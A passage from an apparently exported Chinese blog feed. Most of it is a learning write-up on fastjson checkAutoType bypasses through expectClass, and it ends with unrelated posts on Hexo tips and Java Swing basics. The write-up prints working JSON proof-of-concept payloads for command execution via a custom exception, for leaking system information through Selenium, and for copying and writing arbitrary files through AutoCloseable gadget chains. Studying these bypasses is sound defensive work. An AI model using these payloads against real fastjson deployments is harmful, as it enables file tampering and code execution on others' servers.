<li>(4) <code>typeName</code>不是<code>ClassLoader</code>、<code>DataSource</code>、<code>RowSet</code>的子类；</li>
<li>(5) <code>typeName</code>是<code>expectClass</code>的子类。(isAssignableFrom()方法判断是否为父类)</li>
</ul>
<blockquote>
<p>另外，在<code>1.2.68</code>版本开始，新增了<code>safeMode</code>加固模式。配置safeMode后，无论白名单和黑名单，都不支持autoType，可一定程度上缓解反序列化Gadgets类变种攻击。但该模式默认是不开启的。所以不会影响该漏洞的执行流。<br>该模式的校验判断也是在<code>ParserConfig#checkAutoType()</code>方法中。</p>
</blockquote>
<p>大多数时候调用<code>ParserConfig#checkAutoType()</code> 进行安全校验时，参数<code>expectClass</code>的位置传入的都是<code>null</code>。</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220615153348640.png" alt="image-20220615153348640"></p>
<p>有两个反序列化器的地方调用了传递expectClass的<code>checkAutoType</code>方法</p>
<h3 id="Throwable"><a href="#Throwable" class="headerlink" title="Throwable"></a>Throwable</h3><h5 id="CalcException"><a href="#CalcException" class="headerlink" title="CalcException"></a>CalcException</h5><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CalcException</span> <span class="keyword">extends</span> <span class="title">Exception</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String command;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setCommand</span><span class="params">(String command)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.command = command;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getMessage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Runtime.getRuntime().exec(<span class="keyword">this</span>.command);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">super</span>.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="循环引用"><a href="#循环引用" class="headerlink" title="循环引用"></a>循环引用</h5><p>fastjson支持<a href="https://github.com/alibaba/fastjson/wiki/%E5%BE%AA%E7%8E%AF%E5%BC%95%E7%94%A8">循环引用</a>，并且是缺省打开的。</p>
<p>通过循环引用,我们就可以使用<code>$ref</code>去引用指定对象的某个<code>xxx</code>属性，从而访问该对象的<code>getXXX()</code>方法</p>
<table>
<thead>
<tr>
<th>语法</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>{“$ref”:”$”}</td>
<td>引用根对象</td>
</tr>
<tr>
<td>{“$ref”:”@”}</td>
<td>引用自己</td>
</tr>
<tr>
<td>{“$ref”:”..”}</td>
<td>引用父对象</td>
</tr>
<tr>
<td>{“$ref”:”../..”}</td>
<td>引用父对象的父对象</td>
</tr>
<tr>
<td>{“$ref”:”$.members[0].reportTo”}</td>
<td>基于路径的引用</td>
</tr>
</tbody></table>
<h5 id="poc-1"><a href="#poc-1" class="headerlink" title="poc"></a>poc</h5><p>这个poc本质上可以理解为一个对象里面有两个成员对象x和y</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;x&quot;</span>:</span><br><span class="line">	&#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">	 <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;com.test.CalcException&quot;</span>, </span><br><span class="line">	         <span class="attr">&quot;command&quot;</span>:<span class="string">&quot;calc&quot;</span>&#125;, </span><br><span class="line"> <span class="attr">&quot;y&quot;</span>:&#123;<span class="attr">&quot;$ref&quot;</span>:<span class="string">&quot;$x.message&quot;</span>&#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>在fastjson中，在对某个类型反序列化前，先要进行一次<code>ParserConfig#checkAutoType()</code>检查，然后才是获取相应类型的反序列化器进行反序列化。</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220615210559920.png" alt="image-20220615210559920"></p>
<p>在它的反序列化器<code>ThrowableDeserializer</code>里面继续进行词法分析</p>
<p>检测到<code>@type</code>之后,就调用到了<code>expectClass</code>为<code>Throwable.class</code>的<code>checkAutoType方法</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220615210807185.png" alt="image-20220615210807185"></p>
<p>在这次的checkAutoType方法调用中会走到这里,并且返回<code>CalcException.class</code>给<code>exClass</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220615211602310.png" alt="image-20220615211602310"></p>
<p>最后在这里创建这个自定义的异常类,虽然报了一个由于没有toString方法导致的异常,但是并不影响后面setValue</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220615212234939.png" alt="image-20220615212234939"></p>
<p>最终在setValue这里调用set方法实现set方法调用由于循环引用调用到getMessage从而弹出计算器</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220615212151886.png" alt="image-20220615212151886"></p>
<p>虽然Throwable这个点可以利用,但是实际环境中的异常类很少有比较危险的set或者get方法</p>
<h4 id="依赖selenium的信息泄露gadget"><a href="#依赖selenium的信息泄露gadget" class="headerlink" title="依赖selenium的信息泄露gadget"></a>依赖selenium的信息泄露gadget</h4><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.seleniumhq.selenium<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>selenium-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.1.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个gadget需要目标环境引入selenium依赖</p>
<p>其中，org.openqa.selenium.WebDriverException类的getMessage()方法和getSystemInformation()方法都能获取一些系统信息，比如：IP地址、主机名、系统架构、系统名称、系统版本、JDK版本、selenium webdriver版本。另外，还可通过getStackTrace()来获取函数调用栈，从而获悉使用了什么框架或组件。<br>原理和上面的Throwable一样</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;<span class="attr">&quot;x&quot;</span>:</span><br><span class="line">  &#123;<span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.Exception&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;@type&quot;</span>:<span class="string">&quot;org.openqa.selenium.WebDriverException&quot;</span>&#125;,</span><br><span class="line"> <span class="attr">&quot;y&quot;</span>:&#123;<span class="attr">&quot;$ref&quot;</span>:<span class="string">&quot;$x.systemInformation&quot;</span>&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是<code>getSystemInformation()</code>本身是不回显的</p>
<h3 id="AutoCloseable"><a href="#AutoCloseable" class="headerlink" title="AutoCloseable"></a>AutoCloseable</h3><p>接着来看<code>JavaBeanDeserializer#deserialze()</code>。</p>
<p>原理上，它跟ThrowableDeserializer#deserialze() 这个利用点是一样的，也是通过利用期望类expectClass去绕过<code>checkAutoType()</code>的安全校验。区别在于<code>JavaBeanDeserializer#deserialze()</code>中的expectClass参数是用户可控的，所以漏洞利用可发挥的空间更大。<br>为什么要选择这个接口,其一是因为这个接口和Throwable一样在<code>TypeUtils#mapping</code>中,其二是实现了这个接口的一些类往往和流有关,可能可以操作文件</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220623191250838.png" alt="image-20220623191250838"></p>
<p>fastJson选取构造方法的坑</p>
<p>fastjson在调用<code>JavaBeanDeserializer#deserialze()</code>进行反序列化的过程中，会去寻找目标类的<code>public</code>类型的构造方法：<strong>如果存在无参构造方法，则将其作为构造方法供后续实例化使用；否则使用参数数量最多且排在最前面的构造方法。</strong></p>
<p>根据上面这条规则,使用的是划红线的构造方法,所以在提供参数的时候需要再多提供一个<code>append</code></p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220623202904340.png" alt="image-20220623202904340"></p>
<h5 id="java-io-FileOutputStream"><a href="#java-io-FileOutputStream" class="headerlink" title="java.io.FileOutputStream"></a>java.io.FileOutputStream</h5><p><strong>这个点只能在jdk11+之后才能利用</strong></p>
<p>为什么这个点只能在jdk11之后才能使用?</p>
<p><a href="https://blog.csdn.net/qq_36869808/article/details/123716714">原文地址</a></p>
<p>fastjson 在通过带参构造函数进行<a href="https://so.csdn.net/so/search?q=%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96&spm=1001.2101.3001.7020">反序列化</a>时，会检查参数是否有参数名，只有含有参数名的带参构造函数才会被认可。只有当这个类 class 字节码带有调试信息且其中包含有变量信息时才会有。</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220623230704398.png" alt="image-20220623230704398"></p>
<p>使用<code>javap -l java.io.FileOutputStream</code>显示出行号和本地变量表</p>
<p>分别使用jdk11和jdk1.8执行</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220623230339199.png" alt="image-20220623230339199"></p>
<p>可以明显看出,jdk11的字节码存储了参数的名字,而jdk8只会使用var0,var1这样的符号来表示,也就是说fastjson读取不到参数名</p>
<p>这一点也可以在查看.calss文件的时候体现出来,jdk11的字节码中变量不是使用var0这样的东西来替代的,用得是自己本来的名字</p>
<blockquote>
<p>LocalVariableTable该属性的作用是描述帧栈中局部变量与源码中定义的变量之间的关系。可以使用 -g:none 或<br>-g:vars来取消或生成这项信息，如果没有生成这项信息，那么当别人引用这个方法时，将无法获取到参数名称，取而代之的是arg0, arg1这样的占位符。start<br>表示该局部变量在哪一行开始可见，length表示可见行数，Slot代表所在帧栈位置，Name是变量名称，然后是类型签名。</p>
</blockquote>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line"><span class="attr">&quot;@type&quot;</span>: <span class="string">&quot;java.io.FileOutputStream&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;file&quot;</span>: <span class="string">&quot;C:/temp/test2.txt&quot;</span>,</span><br><span class="line">  <span class="attr">&quot;append&quot;</span>: <span class="string">&quot;false&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="gadget1-复制文件"><a href="#gadget1-复制文件" class="headerlink" title="gadget1 复制文件"></a>gadget1 复制文件</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个依赖中有一个类<code>org.eclipse.core.internal.localstore.SafeFileOutputStream</code></p>
<p>它的构造方法当<code>targetPath</code>不存在且<code>tempPath</code>存在时，便会进行文件复制</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20220623235104501.png" alt="image-20220623235104501"></p>
<p>poc</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    <span class="string">&quot;@type&quot;</span>:<span class="string">&quot;org.eclipse.core.internal.localstore.SafeFileOutputStream&quot;</span>,</span><br><span class="line">    <span class="string">&quot;targetPath&quot;</span>:<span class="string">&quot;C:/temp/test2.txt&quot;</span>,</span><br><span class="line">    <span class="string">&quot;tempPath&quot;</span>:<span class="string">&quot;C:/windows/setupact.log&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h5 id="gadget2-写文件"><a href="#gadget2-写文件" class="headerlink" title="gadget2 写文件"></a>gadget2 写文件</h5><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.esotericsoftware<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>kryo<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.sleepycat<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>je<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">version</span>&gt;</span>18.3.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>poc</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;stream&#x27;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;@type&#x27;:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        &#x27;@type&#x27;:&#x27;org.eclipse.core.internal.localstore.SafeFileOutputStream&#x27;,</span><br><span class="line">        &#x27;targetPath&#x27;:&#x27;/tmp/dst&#x27;,</span><br><span class="line">        &#x27;tempPath&#x27;:&#x27;/tmp/src&#x27;</span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;writer&#x27;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;@type&#x27;:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        &#x27;@type&#x27;:&#x27;com.esotericsoftware.kryo.io.Output&#x27;,</span><br><span class="line">        &#x27;buffer&#x27;:&#x27;aGFja2VkIGJ5IG0wMWUu&#x27;,</span><br><span class="line">        &#x27;outputStream&#x27;:</span><br><span class="line">        &#123;</span><br><span class="line">            &#x27;$ref&#x27;:&#x27;$.stream&#x27;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;position&#x27;:<span class="number">15</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;close&#x27;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;@type&#x27;:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">        &#x27;@type&#x27;:&#x27;com.sleepycat.bind.serial.SerialOutput&#x27;,</span><br><span class="line">        &#x27;out&#x27;:</span><br><span class="line">        &#123;</span><br><span class="line">            &#x27;$ref&#x27;:&#x27;$.writer&#x27;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总体来说是一个循环引用的嵌套</p>
<p>(1) 首先通过<code>org.eclipse.core.internal.localstore.SafeFileOutputStream</code>的构造方法创建一个输出流对象，并通过参数去指定目标路径/tmp/dst;<br>(2) 然后通过<code>com.esotericsoftware.kryo.io.Output</code>的无参构造方法创建输出流对象，并通过setter方法将自身的输出流指向SafeFileOutputStream输出流对象，且通过setter方法往自身缓冲区填充要写入的数据；<br>(3) 最后，再通过<code>com.sleepycat.bind.serial.SerialOutput</code>的构造方法创建输出流对象，并通过参数将输出流指向(2)创建的Output对象；同时在<code>com.sleepycat.bind.serial.SerialOutput</code>构造方法调用的过程中，会调用<code>com.esotericsoftware.kryo.io.Output#flush()</code>方法，将buffer缓冲区的数据写入到目标文件/tmp/dst。</p>
<h5 id="gadget3-写文件-jdk"><a href="#gadget3-写文件-jdk" class="headerlink" title="gadget3 写文件(jdk)"></a>gadget3 写文件(jdk)</h5><p>这是 @rmb122发现的一个仅依赖于JDK的写文件gadget，尽管如此，前面也提到了，成功与否取决于目标程序的JDK是否带调试信息。</p>
<figure class="highlight json"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    &#x27;@type&#x27;:<span class="string">&quot;java.lang.AutoCloseable&quot;</span>,</span><br><span class="line">    &#x27;@type&#x27;:&#x27;sun.rmi.server.MarshalOutputStream&#x27;,</span><br><span class="line">    &#x27;out&#x27;:</span><br><span class="line">    &#123;</span><br><span class="line">        &#x27;@type&#x27;:&#x27;java.util.zip.InflaterOutputStream&#x27;,</span><br><span class="line">        &#x27;out&#x27;:</span><br><span class="line">        &#123;</span><br><span class="line">           &#x27;@type&#x27;:&#x27;java.io.FileOutputStream&#x27;,</span><br><span class="line">           &#x27;file&#x27;:&#x27;C:/temp/test.txt&#x27;,</span><br><span class="line">           &#x27;append&#x27;:<span class="literal">false</span></span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;infl&#x27;:</span><br><span class="line">        &#123;</span><br><span class="line">            &#x27;@type&#x27;:&#x27;java.util.zip.Inflater&#x27;</span><br><span class="line">            &#x27;input&#x27;:</span><br><span class="line">            &#123;</span><br><span class="line">                &#x27;array&#x27;:&#x27;eNoLz0gsKS4uLVBIL60s1lEoycgsVgCiXAPDVD0FT/VchYzUolSFknyF8sSSzLx0hbT8IoVQhbz8cj0uAGcUE78=&#x27;,</span><br><span class="line">                &#x27;limit&#x27;:<span class="number">65</span></span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">        &#x27;bufLen&#x27;:<span class="number">1048576</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#x27;protocolVersion&#x27;:<span class="number">1</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>后面加不加@type都可以写文件,这个点值得研究一下</p>
<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>在学习代码审计的过程中,由于有的使用了fastjson组件从而接触到了fastjson反序列化漏洞,所以根据网络上的文章,大体将每个版本漏洞的产生原理跟着学习了一下,由于水平不足,不能做出一些延伸和思考,后序内容再补</p>
]]></content>
      <categories>
        <category>java</category>
      </categories>
      <tags>
        <tag>fastjson</tag>
        <tag>反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>hexo的一些小技巧</title>
    <url>/2021/12/03/hexo%E7%9A%84%E4%B8%80%E4%BA%9B%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h4 id="设置文章摘要"><a href="#设置文章摘要" class="headerlink" title="设置文章摘要"></a>设置文章摘要</h4><p>打开next配置文件</p>
<p>将该项设置为true</p>
<p><img src="https://blue-satchel.oss-cn-chengdu.aliyuncs.com/img/image-20211205134957202.png" alt="image-20211205134957202"></p>
<p>显示文章摘要有两种方法</p>
<p>1.在需要显示截断的地方添加<code>&lt;!--more--&gt;</code>标签</p>
<p>2.在<code>front-matter</code>中添加<code>description</code>,<code>description</code>中的内容就会添加到首页上面,并且它的优先级高于<code>&lt;!--more--&gt;</code>标签</p>
<h4 id="设置字体高亮"><a href="#设置字体高亮" class="headerlink" title="设置字体高亮"></a>设置字体高亮</h4><p><code>&lt;label style=&quot;background:yellow&quot;&gt;字体背景高亮&lt;/lable&gt;</code></p>
<p><label style="background:yellow">字体背景高亮</lable></p>
<p><code>&lt;label style=&quot;color:red&quot;&gt;修改字体颜色&lt;/lable&gt;</code></p>
<p><label style="color:red">修改字体颜色</lable></p>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
      </tags>
  </entry>
  <entry>
    <title>java_ui</title>
    <url>/2021/12/27/java-ui/</url>
    <content><![CDATA[<h4 id="JFrame"><a href="#JFrame" class="headerlink" title="JFrame"></a>JFrame</h4><p>JFrame初体验</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setSize(<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setLocation(<span class="number">400</span>,<span class="number">300</span>);<span class="comment">//setLocation设置出现在屏幕中的位置</span></span><br><span class="line">        <span class="comment">//setBounds()可以一次性完成上面两句</span></span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);<span class="comment">//设置窗口可见</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;hello&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);<span class="comment">//设置点击关闭后关闭</span></span><br><span class="line">        <span class="comment">/*关闭方式参数</span></span><br><span class="line"><span class="comment">        DO_NOTHING_ON_CLOSE//什么也不做</span></span><br><span class="line"><span class="comment">        HIDE_ON_CLOSE//隐藏当前窗口</span></span><br><span class="line"><span class="comment">        DISPOSE_ON_CLOSE//隐藏当前窗口,并释放窗体占有的其他资源</span></span><br><span class="line"><span class="comment">        EXIT_ON_CLOSE//结束窗口缩在的应用程序 ...一般选这个...</span></span><br><span class="line"><span class="comment">    &#125;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211227233144855.png" alt="image-20211227233144855" style="zoom: 67%;" />

<h4 id="JDialog"><a href="#JDialog" class="headerlink" title="JDialog"></a>JDialog</h4><p>继承自java.awt.Dialog类,他是从一个窗体弹出来的另外一个窗体,他和JFrame类似</p>
<p><code>JDialog:可当成JFrame使用,但必须从属于JFrame</code></p>
<p>构造函数 <strong>一般用第三种</strong></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">JDialog();</span><br><span class="line">JDialog(Frame f);<span class="comment">//指定父窗口</span></span><br><span class="line">JDialog(Frame f,String title);<span class="comment">//指定父窗口+标题</span></span><br></pre></td></tr></table></figure>

<p>关闭方式只有三种,一般选第二种</p>
<p>DO_NOTHING_ON_CLOSE//什么也不做<br>HIDE_ON_CLOSE//隐藏当前窗口<br>DISPOSE_ON_CLOSE//隐藏当前窗口,并释放窗体占有的其他资源</p>
<p>例子</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setSize(<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        <span class="comment">//setLocation设置出现在屏幕中的位置</span></span><br><span class="line">        jf.setLocation(<span class="number">400</span>,<span class="number">300</span>);</span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);<span class="comment">//设置窗口可见</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;hello&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line"></span><br><span class="line">        JDialog jd=<span class="keyword">new</span> JDialog(jf,<span class="string">&quot;jdialog&quot;</span>);</span><br><span class="line">        jd.setBounds(<span class="number">500</span>,<span class="number">400</span>,<span class="number">300</span>,<span class="number">300</span>);</span><br><span class="line">        jd.setVisible(<span class="keyword">true</span>);</span><br><span class="line">        jd.setDefaultCloseOperation(WindowConstants.DISPOSE_ON_CLOSE);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<img src="/images/java-ui/image-20211227234154224.png" alt="image-20211227234154224" style="zoom:67%;" />

<p>关闭JFrame所有窗口都会关闭,关闭JDialogJFrame不受影响</p>
<h4 id="组件和面板"><a href="#组件和面板" class="headerlink" title="组件和面板"></a>组件和面板</h4><p>例子</p>
<p>组件一般添加到Jpanel和JScrollPane再添加到JFrame</p>
<p>JScrollPane是带滚动条的面板,只能添加一个组件,添加多个组件可以先添加到Jpanel再添加到JScrollPane</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.swing.*;</span><br><span class="line"><span class="keyword">import</span> java.awt.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">jFrameTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        JFrame jf=<span class="keyword">new</span> JFrame();</span><br><span class="line">        jf.setBounds(<span class="number">400</span>,<span class="number">300</span>,<span class="number">400</span>,<span class="number">250</span>);</span><br><span class="line">        jf.setVisible(<span class="keyword">true</span>);<span class="comment">//设置窗口可见</span></span><br><span class="line">        jf.setTitle(<span class="string">&quot;hello&quot;</span>);<span class="comment">//设置标题</span></span><br><span class="line">        jf.setDefaultCloseOperation(WindowConstants.EXIT_ON_CLOSE);</span><br><span class="line">        JButton jb1=<span class="keyword">new</span> JButton(<span class="string">&quot;btn1&quot;</span>);</span><br><span class="line">        JButton jb2=<span class="keyword">new</span> JButton(<span class="string">&quot;btn2&quot;</span>);</span><br><span class="line">        JPanel jp=<span class="keyword">new</span> JPanel(<span class="keyword">new</span> FlowLayout());</span><br><span class="line">        jp.add(jb1);</span><br><span class="line">        jp.add(jb2);</span><br><span class="line">        jf.add(jp);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/images/java-ui/image-20211227235300734.png" alt="image-20211227235300734" style="zoom:67%;" />

<h5 id="标签组件JLabel"><a href="#标签组件JLabel" class="headerlink" title="标签组件JLabel"></a>标签组件JLabel</h5><p>和C#中的label一样,类似于只读的文本框</p>
<p>JLabel构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">以下参数都可以省略</span><br><span class="line">JLabel(String str,Icon icon,<span class="keyword">int</span> aligment);<span class="comment">//设置文本,图标,水平对齐方式</span></span><br></pre></td></tr></table></figure>

<h5 id="按钮组件JButton"><a href="#按钮组件JButton" class="headerlink" title="按钮组件JButton"></a>按钮组件JButton</h5><p>JButton构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">以下参数都可以省略</span><br><span class="line">JButton(String text,Icon icon)<span class="comment">//设置文本,图标</span></span><br></pre></td></tr></table></figure>

<p>其他JButton类内自带方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">setTooltipText(String text)<span class="comment">//设置提示文本</span></span><br><span class="line">setBorderPainted();<span class="comment">//设置边界是否显示</span></span><br><span class="line">setEnabled();<span class="comment">//设置按钮知否可用</span></span><br></pre></td></tr></table></figure>

<h5 id="单选按钮组件JRadioButton"><a href="#单选按钮组件JRadioButton" class="headerlink" title="单选按钮组件JRadioButton"></a>单选按钮组件JRadioButton</h5><p>JRadioButton构造方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">以下参数都可以省略,一般只用指定文字即可</span><br><span class="line">JRadioButton(String text,Icon icon,<span class="keyword">boolean</span> selected)<span class="comment">//指定文字,图标,是否选中</span></span><br></pre></td></tr></table></figure>

<p>例子</p>
